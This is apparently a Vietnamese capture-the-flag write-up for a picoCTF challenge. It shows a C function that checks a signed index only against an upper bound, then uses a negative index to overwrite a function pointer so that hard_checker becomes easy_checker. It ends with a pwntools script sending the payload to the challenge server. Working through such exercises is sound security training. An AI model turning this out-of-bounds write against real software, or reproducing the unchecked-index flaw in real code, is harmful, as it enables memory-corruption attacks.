# tìm lỗi
ta nhìn vào hàm vuln()
```c
void vuln()
{
  char story[128];
  int num1, num2;
 
  printf("Tell me a story and then I'll tell you if you're a 1337 >> ");
  scanf("%127s", story);
  printf("On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n");
  scanf("%d %d", &num1, &num2);
 
  if (num1 < 10)
  {
    fun[num1] += num2;
  }
 
  check(story, strlen(story));
}
```
chương trình cho ta nhập số âm, nên chúng ta sẽ thay đổi giá trị 'check' trỏ đến địa chi hàm easy_checker()

# thực thi
ta có ```0x804c040 <check>``` và ```0x804c080 <fun>```
```c
>>> (0x804c080 - 0x804c040)/4
16.0
>>> hex(0x804c080 + (-16)*4)
'0x804c040'
```
Nếu ta nhập -16 cho num1 làm cho fun[num1] trỏ đến check

tiếp đến ta sẽ chuyển địa chỉ hàm hard_checker() về easy_checker()

```c
>>> 0x8049436 - 0x80492fc
314
>>> hex(0x8049436 + (-314))
'0x80492fc'
```

# stage 2
tiếp đến hàm calculate_story_score()  sẽ tính điểm như sau nếu ta nhập "AAAABBBB"
```c
>>> score = ord('A')*4 + ord('B')*4
>>> score
524
```
ta cần nhập chuỗi sao cho = 1337, và các byte cần bé hơn 0x7f
```
>>> hex(int(1337 / 5))
'0x10b'
>>> hex(int(1337 / 10))
'0x85'
>>> hex(int(1337 / 15))
'0x59'
>>> hex(int(1337 / 20))
'0x42'
>>> 20*0x42
1320
1320 + 0x11
```

```python
from pwn import *
p = connect('saturn.picoctf.net', 56083)
 
payload = b'B'*20 + b'\x11'
p.sendlineafter(b're a 1337 >> ', payload)
payload = b"-16 -314"
p.sendlineafter(b'rst one less than 10.', payload)
 
p.interactive()
```
